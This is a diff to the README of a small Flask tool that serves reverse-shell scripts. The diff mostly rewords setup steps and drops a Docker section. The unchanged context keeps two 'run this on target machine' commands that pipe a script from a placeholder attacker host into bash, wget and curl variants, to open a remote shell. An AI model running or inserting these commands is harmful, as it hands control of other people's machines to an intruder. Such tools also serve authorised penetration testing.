@@ -1,7 +1,6 @@
 # shells
-shells, based on [reverse-shell](https://github.com/lukechilds/reverse-shell).
 
-## run
+## setup and run
 setup python environment
 ```bash
 pipenv install
@@ -12,12 +11,12 @@ virtual environment and run
 pipenv shell
 flask run --port 8080 --host 0.0.0.0
 ```
-or just run this
+or 
 ```
 pipenv run flask run --port 8080 --host 0.0.0.0
 ```
 ### lazy run
-change port and host in `__init__.py` file.
+runs in port 8000, change port if needed.
 ```
 python3 app/__init__.py
 ```
@@ -41,19 +40,4 @@ run this on target machine:
 wget -qO- http://mi-ip-host:port/127.0.0.1:1338 | bash
 
 curl http://mi-ip-host:port/127.0.0.1:1338 | bash
-```
-
-
-# docker
-build the image
-```
-docker build -t shells .
-```
-run the docker container
-```
-docker run -p 8000:8000 shells
-```
-runtime details
-```
-docker ps
 ```
